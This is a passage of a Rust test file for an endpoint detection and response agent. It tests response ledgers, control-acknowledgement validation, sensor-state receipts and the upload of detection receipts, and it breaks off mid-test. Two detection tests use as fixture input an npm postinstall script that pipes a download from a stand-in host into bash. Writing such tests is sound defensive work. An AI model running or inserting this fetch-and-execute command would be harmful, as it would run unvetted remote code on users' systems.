    #[test]
    fn agent_edr_response_acknowledgement_ledger_persists_and_reopens_acknowledgement() {
        let (execution, _subgraph) = test_collect_evidence_execution(
            "proc-ack-ledger-1",
            "ack-ledger.example.invalid",
            600,
            "collect evidence bundle for acknowledgement ledger test",
        );
        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("reviewed local execution".to_string()),
            execution.completed_at + chrono::Duration::seconds(3),
        );
        let ledger_path = test_response_acknowledgement_path();

        EndpointResponseAcknowledgementLedger::open(&ledger_path)
            .unwrap_or_else(|err| panic!("failed to open response acknowledgement ledger: {err}"))
            .append(&acknowledgement)
            .unwrap_or_else(|err| panic!("failed to append response acknowledgement: {err}"));

        let reopened =
            EndpointResponseAcknowledgementLedger::open(&ledger_path).unwrap_or_else(|err| {
                panic!("failed to reopen response acknowledgement ledger: {err}")
            });
        let recent = reopened
            .read_recent(10)
            .unwrap_or_else(|err| panic!("failed to read response acknowledgements: {err}"));
        assert_eq!(recent.len(), 1);
        assert_eq!(
            recent[0].acknowledgement_id,
            acknowledgement.acknowledgement_id
        );
        assert_eq!(recent[0].execution_id, execution.execution_id);
        assert_eq!(recent[0].acknowledged_by, "operator:test");

        let _ = std::fs::remove_file(ledger_path);
    }

    #[test]
    fn agent_edr_response_execution_ledger_cancels_execution_once() {
        let (execution, _subgraph) = test_collect_evidence_execution(
            "proc-execution-cancel-1",
            "execution-cancel.example.invalid",
            600,
            "collect evidence bundle for cancellation ledger test",
        );
        let ledger_path = test_response_execution_path();
        let mut ledger = EndpointResponseExecutionLedger::open(&ledger_path)
            .unwrap_or_else(|err| panic!("failed to open response execution ledger: {err}"));
        ledger
            .append(&execution)
            .unwrap_or_else(|err| panic!("failed to append response execution: {err}"));

        let cancelled = ledger
            .cancel(
                &execution,
                "operator closed the local response window",
                execution.completed_at + chrono::Duration::seconds(10),
            )
            .unwrap_or_else(|err| panic!("failed to cancel response execution: {err}"))
            .unwrap_or_else(|| panic!("missing cancelled response execution"));
        assert_eq!(cancelled.status, EndpointResponseExecutionStatus::Cancelled);
        assert_eq!(cancelled.rollback_ref, execution.rollback_ref);
        assert_eq!(
            cancelled.reason,
            "operator closed the local response window"
        );

        let cancelled_again = ledger
            .cancel(
                &execution,
                "duplicate cancellation should not append",
                execution.completed_at + chrono::Duration::seconds(11),
            )
            .unwrap_or_else(|err| panic!("failed to re-run response cancellation: {err}"));
        assert!(cancelled_again.is_none());
        let expired = ledger
            .expire_due(execution.expires_at() + chrono::Duration::seconds(1))
            .unwrap_or_else(|err| panic!("failed to expire cancelled response execution: {err}"));
        assert!(expired.is_empty());

        let recent = ledger
            .read_recent(10)
            .unwrap_or_else(|err| panic!("failed to read response execution ledger: {err}"));
        assert_eq!(recent.len(), 2);
        assert_eq!(recent[1].status, EndpointResponseExecutionStatus::Cancelled);

        let _ = std::fs::remove_file(ledger_path);
    }

    #[test]
    fn agent_edr_response_execution_ledger_marks_rollback_terminal() {
        let (execution, _subgraph) = test_collect_evidence_execution(
            "proc-execution-rollback-1",
            "execution-rollback.example.invalid",
            600,
            "collect evidence bundle for rollback ledger test",
        );
        let ledger_path = test_response_execution_path();
        let mut ledger = EndpointResponseExecutionLedger::open(&ledger_path)
            .unwrap_or_else(|err| panic!("failed to open response execution ledger: {err}"));
        ledger
            .append(&execution)
            .unwrap_or_else(|err| panic!("failed to append response execution: {err}"));

        let rolled_back = ledger
            .roll_back(
                &execution,
                "operator rolled back local response",
                execution.completed_at + chrono::Duration::seconds(12),
            )
            .unwrap_or_else(|err| panic!("failed to roll back response execution: {err}"))
            .unwrap_or_else(|| panic!("missing rolled-back response execution"));
        assert_eq!(
            rolled_back.status,
            EndpointResponseExecutionStatus::RolledBack
        );
        assert_eq!(rolled_back.rollback_ref, execution.rollback_ref);
        assert_eq!(rolled_back.reason, "operator rolled back local response");
        assert!(ledger
            .has_terminal_transition_for(&execution)
            .unwrap_or_else(|err| panic!("failed to check terminal transition: {err}")));

        let rolled_back_again = ledger
            .roll_back(
                &execution,
                "duplicate rollback should not append",
                execution.completed_at + chrono::Duration::seconds(13),
            )
            .unwrap_or_else(|err| panic!("failed to re-run response rollback: {err}"));
        assert!(rolled_back_again.is_none());

        let mut repeated_execution = execution.clone();
        repeated_execution.started_at = execution.started_at + chrono::Duration::seconds(20);
        repeated_execution.completed_at = repeated_execution.started_at;
        repeated_execution.evidence_bundle.created_at = repeated_execution.completed_at;
        ledger
            .append(&repeated_execution)
            .unwrap_or_else(|err| panic!("failed to append repeated response execution: {err}"));
        assert!(!ledger
            .has_terminal_transition_for(&repeated_execution)
            .unwrap_or_else(|err| {
                panic!("failed to check repeated execution terminal transition: {err}")
            }));
        let repeated_cancelled = ledger
            .cancel(
                &repeated_execution,
                "operator cancelled repeated local response",
                repeated_execution.completed_at + chrono::Duration::seconds(1),
            )
            .unwrap_or_else(|err| panic!("failed to cancel repeated response execution: {err}"))
            .unwrap_or_else(|| panic!("missing repeated cancelled response execution"));
        assert_eq!(
            repeated_cancelled.status,
            EndpointResponseExecutionStatus::Cancelled
        );

        let expired = ledger
            .expire_due(execution.expires_at() + chrono::Duration::seconds(1))
            .unwrap_or_else(|err| panic!("failed to expire rolled-back response execution: {err}"));
        assert!(expired.is_empty());

        let recent = ledger
            .read_recent(10)
            .unwrap_or_else(|err| panic!("failed to read response execution ledger: {err}"));
        assert_eq!(recent.len(), 4);
        assert_eq!(
            recent[1].status,
            EndpointResponseExecutionStatus::RolledBack
        );
        assert_eq!(recent[2].status, EndpointResponseExecutionStatus::Succeeded);
        assert_eq!(recent[3].status, EndpointResponseExecutionStatus::Cancelled);

        let _ = std::fs::remove_file(ledger_path);
    }

    #[test]
    fn agent_edr_response_execution_ledger_marks_rollback_failed_terminal() {
        let (execution, _subgraph) = test_collect_evidence_execution(
            "proc-execution-rollback-failed-1",
            "execution-rollback-failed.example.invalid",
            600,
            "collect evidence bundle for rollback failure ledger test",
        );
        let ledger_path = test_response_execution_path();
        let mut ledger = EndpointResponseExecutionLedger::open(&ledger_path)
            .unwrap_or_else(|err| panic!("failed to open response execution ledger: {err}"));
        ledger
            .append(&execution)
            .unwrap_or_else(|err| panic!("failed to append response execution: {err}"));
        let failed = EndpointResponseExecutionReport::rollback_failed_from(
            &execution,
            "ttl expired",
            "network extension rollback helper failed",
            execution.completed_at + chrono::Duration::seconds(10),
        );
        ledger
            .append(&failed)
            .unwrap_or_else(|err| panic!("failed to append rollback-failed transition: {err}"));

        assert!(ledger
            .has_terminal_transition_for(&execution)
            .unwrap_or_else(|err| panic!("failed to check terminal transition: {err}")));
        let expired = ledger
            .expire_due(execution.expires_at() + chrono::Duration::seconds(1))
            .unwrap_or_else(|err| {
                panic!("failed to expire rollback-failed response execution: {err}")
            });
        assert!(expired.is_empty());

        let _ = std::fs::remove_file(ledger_path);
    }

    #[test]
    fn control_acknowledgement_correlation_rejects_unknown_target_kind() {
        let (execution, _subgraph) = test_collect_evidence_execution(
            "proc-control-ack-target-kind-1",
            "control-ack-target-kind.example.invalid",
            600,
            "collect evidence bundle for control acknowledgement target-kind validation",
        );
        let input = EdrResponseControlAcknowledgementInput {
            response_action_id: Some("11111111-1111-4111-8111-111111111111".to_string()),
            delivery_id: Some("22222222-2222-4222-8222-222222222222".to_string()),
            target_kind: Some("deployment".to_string()),
            target_id: Some("test-agent".to_string()),
            ack_token: Some("control-ack-token".to_string()),
            status: Some("acknowledged".to_string()),
            resulting_state: Some("collect_evidence:succeeded".to_string()),
            control_api_url: None,
            control_api_token: None,
        };

        let err = match endpoint_response_control_correlation(Some(&input), &execution) {
            Ok(_) => panic!("unsupported control acknowledgement target kind was accepted"),
            Err(err) => err,
        };
        assert_eq!(err.0, StatusCode::BAD_REQUEST);
        assert!(err
            .1
            .contains("unsupported control response acknowledgement targetKind"));
    }

    #[test]
    fn control_acknowledgement_discriminator_errors_do_not_echo_raw_values() {
        let (execution, _subgraph) = test_collect_evidence_execution(
            "proc-control-ack-discriminator-1",
            "control-ack-discriminator.example.invalid",
            600,
            "collect evidence bundle for control acknowledgement discriminator validation",
        );

        let unsupported_target_kind = "deployment-secret-target-kind".to_string();
        let target_kind_input = EdrResponseControlAcknowledgementInput {
            response_action_id: Some("11111111-1111-4111-8111-111111111111".to_string()),
            delivery_id: Some("22222222-2222-4222-8222-222222222222".to_string()),
            target_kind: Some(unsupported_target_kind.clone()),
            target_id: Some("test-agent".to_string()),
            ack_token: Some("control-ack-token".to_string()),
            status: Some("acknowledged".to_string()),
            resulting_state: Some("collect_evidence:succeeded".to_string()),
            control_api_url: None,
            control_api_token: None,
        };
        let target_kind_err =
            match endpoint_response_control_correlation(Some(&target_kind_input), &execution) {
                Ok(_) => panic!("unsupported control acknowledgement target kind was accepted"),
                Err(err) => err,
            };
        assert_eq!(target_kind_err.0, StatusCode::BAD_REQUEST);
        assert!(!target_kind_err.1.contains(&unsupported_target_kind));

        let oversized_status = "status-secret-".repeat(64);
        let status_input = EdrResponseControlAcknowledgementInput {
            response_action_id: Some("11111111-1111-4111-8111-111111111111".to_string()),
            delivery_id: Some("22222222-2222-4222-8222-222222222222".to_string()),
            target_kind: Some("endpoint".to_string()),
            target_id: Some("test-agent".to_string()),
            ack_token: Some("control-ack-token".to_string()),
            status: Some(oversized_status.clone()),
            resulting_state: Some("collect_evidence:succeeded".to_string()),
            control_api_url: None,
            control_api_token: None,
        };
        let status_err =
            match endpoint_response_control_correlation(Some(&status_input), &execution) {
                Ok(_) => panic!("unsupported control acknowledgement status was accepted"),
                Err(err) => err,
            };
        assert_eq!(status_err.0, StatusCode::BAD_REQUEST);
        assert!(!status_err.1.contains(&oversized_status));
    }

    #[tokio::test]
    async fn agent_edr_response_execution_expire_emits_expiration_receipt() {
        let state = test_state();
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-expire-route-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "expire-route.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://expire-route.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        let mut recorder = CausalGraphRecorder::new();
        recorder.record_observation(&observation);
        let root_node_id = observation.process.stable_node_id();
        let subgraph = recorder
            .graph()
            .causal_subgraph_from(&root_node_id, 3)
            .unwrap_or_else(|| panic!("missing expiration route subgraph"));
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &root_node_id,
            &subgraph,
            1,
            "collect evidence bundle for expiration route test",
        );
        let mut execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to build collect evidence report: {err}"));
        execution.started_at -= chrono::Duration::seconds(5);
        execution.completed_at = execution.started_at;
        state
            .edr_evidence_bundle_store
            .lock()
            .await
            .store(&execution.evidence_bundle, &subgraph)
            .unwrap_or_else(|err| panic!("failed to store expiration evidence bundle: {err}"));
        state
            .edr_response_execution_ledger
            .lock()
            .await
            .append(&execution)
            .unwrap_or_else(|err| panic!("failed to append expiring response execution: {err}"));

        let app = Router::new()
            .route(
                "/api/v1/agent/edr/response-executions/expire",
                post(agent_edr_response_execution_expire),
            )
            .with_state(Arc::new(state));
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-executions/expire")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|err| panic!("failed to build expiration sweep request: {err}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|err| panic!("expiration sweep request failed: {err}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|err| panic!("failed to read expiration sweep response: {err}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|err| panic!("failed to decode expiration sweep response: {err}"));
        assert_eq!(payload["expired_count"], 1);
        assert_eq!(payload["executions"][0]["execution"]["status"], "expired");
        assert_eq!(
            payload["executions"][0]["rollbackRef"],
            execution.rollback_ref
        );

        let receipt: SignedReceipt = serde_json::from_value(payload["receipts"][0].clone())
            .unwrap_or_else(|err| panic!("failed to decode expiration receipt: {err}"));
        let endpoint_decision = receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing expiration endpointDecision metadata"));
        assert_eq!(endpoint_decision["receiptFamily"], "response_execution");
        assert_eq!(
            endpoint_decision["decision"]["passed"],
            serde_json::Value::Bool(false)
        );
        assert_eq!(
            endpoint_decision["decision"]["rollbackRef"],
            execution.rollback_ref
        );
    }

    #[tokio::test]
    async fn agent_edr_protection_state_emits_signed_sensor_state_receipt() {
        let state = test_state();
        state
            .macos_host
            .replace_status(CombinedSystemExtensionStatus {
                install_state: SystemExtensionInstallState::Installed,
                approval: SystemExtensionApproval::Approved,
                endpoint_security: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    ..ProviderStatus::unknown()
                },
                network_extension: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    ..ProviderStatus::unknown()
                },
                ..CombinedSystemExtensionStatus::default()
            })
            .await;
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/protection-state",
                get(agent_edr_protection_state),
            )
            .with_state(Arc::new(state));
        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/protection-state")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build protection state request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("protection state request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read protection state response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode protection state response: {e}"));

        assert_eq!(payload["policy"]["policyVersion"], "test-edr");
        assert!(payload["sensor_state"]["providers"]
            .as_array()
            .unwrap_or_else(|| panic!("missing sensor providers"))
            .iter()
            .any(|provider| provider["providerId"] == "agent-api"));
        assert!(payload["sensor_state"]["providers"]
            .as_array()
            .unwrap_or_else(|| panic!("missing sensor providers"))
            .iter()
            .any(|provider| provider["providerId"] == "macos.endpoint_security"));
        assert_eq!(
            payload["degraded_provider_receipts"]
                .as_array()
                .unwrap_or_else(|| panic!("missing degraded provider receipts"))
                .len(),
            0
        );

        let signed: SignedReceipt = serde_json::from_value(payload["receipt"].clone())
            .unwrap_or_else(|e| panic!("failed to decode sensor state receipt: {e}"));
        let endpoint_decision = signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing endpointDecision sensor state metadata"));
        let public_key = endpoint_decision
            .get("signer")
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing sensor state receipt signer public key"));
        let public_key = hush_core::PublicKey::from_hex(public_key)
            .unwrap_or_else(|e| panic!("failed to parse sensor receipt public key: {e}"));
        let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(public_key));
        assert!(verification.valid);
        assert_eq!(endpoint_decision["receiptFamily"], "sensor_state");
        assert_eq!(
            endpoint_decision["decision"]["ruleId"],
            "endpoint.sensor_state"
        );
        assert_eq!(
            endpoint_decision["actor"]["endpointId"],
            serde_json::Value::String("test-agent".to_string())
        );
    }

    #[tokio::test]
    async fn agent_edr_protection_state_emits_degraded_provider_receipts() {
        let state = test_state();
        state
            .macos_host
            .replace_status(CombinedSystemExtensionStatus {
                install_state: SystemExtensionInstallState::Installed,
                approval: SystemExtensionApproval::Approved,
                endpoint_security: ProviderStatus {
                    runtime: ProviderRuntimeState::Degraded {
                        reason: "missing full disk access".to_string(),
                    },
                    ..ProviderStatus::unknown()
                },
                network_extension: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    ..ProviderStatus::unknown()
                },
                ..CombinedSystemExtensionStatus::default()
            })
            .await;
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/protection-state",
                get(agent_edr_protection_state),
            )
            .with_state(Arc::new(state));
        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/protection-state")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build degraded protection state request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("degraded protection state request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read degraded protection response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode degraded protection response: {e}"));

        let degraded_receipts = payload["degraded_provider_receipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing degraded provider receipts"));
        assert_eq!(degraded_receipts.len(), 1);
        let receipt: SignedReceipt = serde_json::from_value(degraded_receipts[0].clone())
            .unwrap_or_else(|e| panic!("failed to decode provider degradation receipt: {e}"));
        let endpoint_decision = receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing provider degradation endpointDecision metadata"));
        let public_key = endpoint_decision
            .get("signer")
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing provider degradation signer public key"));
        let public_key = hush_core::PublicKey::from_hex(public_key)
            .unwrap_or_else(|e| panic!("failed to parse provider degradation public key: {e}"));
        let verification = receipt.verify(&hush_core::receipt::PublicKeySet::new(public_key));
        assert!(verification.valid);
        assert_eq!(endpoint_decision["receiptFamily"], "provider_degradation");
        assert_eq!(
            endpoint_decision["decision"]["passed"],
            serde_json::Value::Bool(false)
        );
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][1]["providerId"],
            "macos.endpoint_security"
        );
        let false_hash = sha256(b"false").to_hex_prefixed();
        let evidence = endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing provider degradation receipt evidence"));
        assert!(evidence.iter().any(|item| {
            item["key"] == "fullDiskAccess"
                && item["valueHash"].as_str() == Some(false_hash.as_str())
        }));
    }

    #[tokio::test]
    async fn agent_edr_protection_state_binds_provider_recovery_evidence() {
        let state = test_state();
        state
            .macos_host
            .replace_status(CombinedSystemExtensionStatus {
                install_state: SystemExtensionInstallState::Installed,
                approval: SystemExtensionApproval::Approved,
                endpoint_security: ProviderStatus {
                    runtime: ProviderRuntimeState::Inactive,
                    provider_state: Some(crate::macos::status::ProviderAttestationState {
                        provider: "endpoint_security".to_string(),
                        installed: true,
                        approval_status: crate::macos::status::ProviderApprovalStatus::Approved,
                        active: false,
                        healthy: false,
                        availability: crate::macos::status::ProviderAvailability::Inactive,
                        degraded_reasons: vec!["provider_inactive".to_string()],
                        last_healthy_timestamp: Some("2026-05-17T11:58:00Z".to_string()),
                    }),
                    ..ProviderStatus::unknown()
                },
                network_extension: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    ..ProviderStatus::unknown()
                },
                ..CombinedSystemExtensionStatus::default()
            })
            .await;
        state
            .macos_host
            .replace_status(CombinedSystemExtensionStatus {
                install_state: SystemExtensionInstallState::Installed,
                approval: SystemExtensionApproval::Approved,
                endpoint_security: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    provider_state: Some(crate::macos::status::ProviderAttestationState {
                        provider: "endpoint_security".to_string(),
                        installed: true,
                        approval_status: crate::macos::status::ProviderApprovalStatus::Approved,
                        active: true,
                        healthy: true,
                        availability: crate::macos::status::ProviderAvailability::Active,
                        degraded_reasons: Vec::new(),
                        last_healthy_timestamp: Some("2026-05-17T12:00:00Z".to_string()),
                    }),
                    ..ProviderStatus::unknown()
                },
                network_extension: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    ..ProviderStatus::unknown()
                },
                ..CombinedSystemExtensionStatus::default()
            })
            .await;
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/protection-state",
                get(agent_edr_protection_state),
            )
            .with_state(Arc::new(state));
        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/protection-state")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build recovered protection state request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("recovered protection state request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read recovered protection response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode recovered protection response: {e}"));

        let recoveries = payload["provider_recoveries"]
            .as_array()
            .unwrap_or_else(|| panic!("missing provider recovery records"));
        assert_eq!(recoveries.len(), 1);
        assert_eq!(recoveries[0]["providerId"], "macos.endpoint_security");
        assert_eq!(recoveries[0]["previousDegraded"], true);
        assert_eq!(recoveries[0]["currentHealthy"], true);
        assert_eq!(
            payload["degraded_provider_receipts"]
                .as_array()
                .unwrap_or_else(|| panic!("missing recovered degraded provider receipts"))
                .len(),
            0
        );

        let receipt: SignedReceipt = serde_json::from_value(payload["receipt"].clone())
            .unwrap_or_else(|e| panic!("failed to decode recovery sensor-state receipt: {e}"));
        let endpoint_decision = receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing recovery endpointDecision metadata"));
        assert_eq!(endpoint_decision["receiptFamily"], "sensor_state");
        let count_hash = sha256(b"1").to_hex_prefixed();
        let provider_hash = sha256(b"macos.endpoint_security").to_hex_prefixed();
        let evidence = endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing recovery sensor-state evidence"));
        assert!(evidence.iter().any(|item| {
            item["key"] == "providerRecoveryCount"
                && item["valueHash"].as_str() == Some(count_hash.as_str())
        }));
        assert!(evidence.iter().any(|item| {
            item["key"] == "providerRecoveredIds"
                && item["valueHash"].as_str() == Some(provider_hash.as_str())
        }));
    }

    #[tokio::test]
    async fn agent_edr_receipts_lists_persisted_signed_receipts_by_family() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[43u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-signer".to_string(),
            signer_public_key,
        }));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route("/api/v1/agent/edr/receipts", get(agent_edr_receipts))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                image: Some("/usr/local/bin/npm".to_string()),
                signing: CodeSignatureStatus {
                    trust: SignatureTrust::Signed,
                    ..CodeSignatureStatus::default()
                },
                ..EndpointProcess::default()
            },
            event: EndpointEvent::PackageScript {
                manager: PackageManager::Npm,
                package: Some("leftpad-suspicious".to_string()),
                phase: "postinstall".to_string(),
                script: "curl https://example.invalid/payload.sh | bash".to_string(),
                working_directory: Some("/tmp/pkg".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build edr findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("edr findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/receipts?family=detection&limit=10")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build receipts request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("receipts request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read receipts response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode receipts response: {e}"));

        assert_eq!(payload["receipt_count"], 1);
        assert_eq!(
            payload["path"],
            serde_json::Value::String(receipt_path.display().to_string())
        );
        let endpoint_decision = payload["receipts"][0]["receipt"]["metadata"]["endpointDecision"]
            .as_object()
            .unwrap_or_else(|| panic!("missing listed endpointDecision receipt"));
        assert_eq!(
            endpoint_decision.get("receiptFamily"),
            Some(&serde_json::Value::String("detection".to_string()))
        );
        let finding_id = endpoint_decision
            .get("decision")
            .and_then(|decision| decision.get("findingId"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing detection finding id"));

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/receipts?family=detection&action=alert&ruleId=supply_chain.install_script.risky&findingId={finding_id}&limit=10"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build filtered receipts request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("filtered receipts request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read filtered receipts response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode filtered receipts response: {e}"));

        assert_eq!(payload["receipt_count"], 1);
        let _ = std::fs::remove_file(receipt_path);
    }

    #[tokio::test]
    async fn agent_edr_receipts_upload_projects_signed_receipts_to_control_api_batch() {
        let receipt_path = test_receipt_path();
        let (control_api_url, control_api_state, control_api_task) =
            spawn_mock_control_api_receipts().await;
        let keypair = Keypair::from_seed(&[51u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: format!("agent-enrollment:{signer_public_key}"),
            signer_public_key: signer_public_key.clone(),
        }));
        let state = Arc::new(state);
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/receipts/upload",
                post(agent_edr_receipts_upload),
            )
            .with_state(state.clone());
        let observation = EndpointObservation {
            process: EndpointProcess {
                image: Some("/usr/local/bin/npm".to_string()),
                signing: CodeSignatureStatus {
                    trust: SignatureTrust::Signed,
                    ..CodeSignatureStatus::default()
                },
                ..EndpointProcess::default()
            },
            event: EndpointEvent::PackageScript {
                manager: PackageManager::Npm,
                package: Some("leftpad-upload-suspicious".to_string()),
                phase: "postinstall".to_string(),
                script: "curl https://example.invalid/payload.sh | bash".to_string(),
                working_directory: Some("/tmp/pkg".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build upload findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("upload findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let dry_run_body = serde_json::json!({
            "family": "detection",
            "limit": 10,
            "dryRun": true
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/receipts/upload")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(dry_run_body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build receipt upload dry-run request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("receipt upload dry-run request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read receipt upload dry-run response: {e}"));
        let dry_run_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode receipt upload dry-run response: {e}"));
        assert_eq!(dry_run_payload["dryRun"], true);
        assert_eq!(dry_run_payload["selectedCount"], 1);
        assert_eq!(dry_run_payload["attempted"], false);
        assert_eq!(dry_run_payload["uploadedCount"], 0);
        assert_eq!(dry_run_payload["records"][0]["family"], "detection");
        assert_eq!(dry_run_payload["records"][0]["verdict"], "deny");
        {
            let requests = control_api_state.requests.lock().await;
            assert_eq!(requests.len(), 0);
        }

        {
            let mut settings = state.settings.write().await;
            settings.control_api.enabled = true;
            settings.control_api.url = Some(control_api_url.clone());
            settings.control_api.api_key = Some("configured-control-api-key".to_string());
        }
        let upload_body = serde_json::json!({
            "family": "detection",
            "limit": 10,
            "dryRun": false
        });
        let req = axum::http::Request::builder()
